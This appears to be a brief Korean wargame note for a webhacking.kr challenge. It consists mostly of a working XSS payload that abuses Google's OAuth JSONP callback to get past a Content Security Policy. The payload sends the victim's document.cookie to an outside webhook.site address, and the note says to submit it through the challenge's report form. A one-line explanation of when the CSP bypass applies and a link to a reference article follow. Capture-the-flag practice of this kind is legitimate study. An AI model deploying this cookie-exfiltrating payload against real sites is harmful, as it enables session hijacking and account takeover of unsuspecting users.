#web-hacking 
# Payload
```text
Test URL : 
http://webhacking.kr:10014/?inject=<script src="https://accounts.google.com/o/oauth2/revoke?callback=location.href='https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6/'%252Bdocument.cookie;"></script>

Payload : report 페이지 양식에 다음을 입력
?inject=<script src="https://accounts.google.com/o/oauth2/revoke?callback=location.href='https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6/'%252Bdocument.cookie;"></script>
```
- 참고 사이트 : [여기](https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/#:~:text=%EC%9E%88%EA%B8%B0%20%EB%95%8C%EB%AC%B8%EC%97%90%20%EC%9E%91%EB%8F%99%ED%95%A9%EB%8B%88%EB%8B%A4.-,%EC%8A%B9%EC%9D%B8%EB%90%9C%20JSONP%20%EC%97%94%EB%93%9C%ED%8F%AC%EC%9D%B8%ED%8A%B8%EC%9D%98%20%EC%95%85%EC%9A%A9,-Content%2DSecurity%2DPolicy)
- 허가된 스크립트 불러오는 사이트가 google이거나, 허가된 사이트가 JSONP 엔드포인트가 있고, 마음대로 테스트 해 볼 수 있을 때 사용 가능하다.
